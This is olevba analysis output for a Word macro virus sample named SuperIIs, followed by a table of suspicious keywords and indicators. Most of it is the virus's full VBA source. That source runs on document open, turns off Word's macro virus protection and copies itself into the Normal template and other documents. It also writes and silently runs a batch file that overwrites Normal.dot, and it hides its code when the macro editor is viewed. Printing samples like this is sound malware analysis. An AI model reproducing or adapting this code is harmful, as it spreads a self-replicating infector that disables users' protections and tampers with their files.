olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.SuperIIs-79c7a80e77bf0200d9a0fda0de3881c6b565c60b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.SuperIIs-79c7a80e77bf0200d9a0fda0de3881c6b565c60b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.SuperIIs-79c7a80e77bf0200d9a0fda0de3881c6b565c60b - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo eb
'MyName=SuperIISv1.0
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
'Clean Activedocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Clean NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
l = ""
On Error GoTo 0
On Error GoTo eb
NormalTemplate.OpenAsDocument
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
notemp:
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.deletelines 1, a
NormAt = False
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close #1
If NormAt = True Then GoTo NoBat
a = Shell(windir & "\System\lo.bat", 0)
NoBat:
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
esub:
eb:
NormalTemplate.Saved = True
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
'Save ActiveDocument:
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
'Clean Activedocument:
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Save NormalTemplate:
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoDocL:
Else
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.deletelines 1, a
NormalTemplate.OpenAsDocument
NormAt = False
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
Print #1, "If not exist " & Left(NormalTemplate.FullName, l) & "~$Normal.dot goto start"
Print #1, "Goto Begin"
Print #1, ":Start"
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Print #1, windir & "\command\Attrib.exe -s -h -r " & NormalTemplate.FullName
Print #1, "Copy/y " & windir & "\System\lo.sys " & NormalTemplate.FullName
Close #1
If NormAt = True Then GoTo NoBat
a = Shell(windir & "\System\lo.bat", 0)
NoBat:
For i = 1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
End If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
NormAt = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
ms = ActiveDocument.VBProject.VBComponents.Count
For t = 1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
Next ii
End If
ms = NormalTemplate.VBProject.VBComponents.Count
For t2 = 1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.0" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
Next iiii
End If
If NormT <> 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For inn = 2 To ms
a = NormalTemplate.VBProject.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
NormalTemplate.VBProject.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
notemp:
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For inn2 = 2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoInf:
eb:
d = Dir(NormalTemplate.FullName)
If d = "" Then Exit Sub
If NormAt = True Then
SetAttr (NormalTemplate.FullName), vbNormal
Else
NormalTemplate.Save
End If
'First ever used this kind of Stealth
'Written by Flitnic. I haven't yet included a payload!
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |lo.bat              |Executable file name                         |
|IOC       |Attrib.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

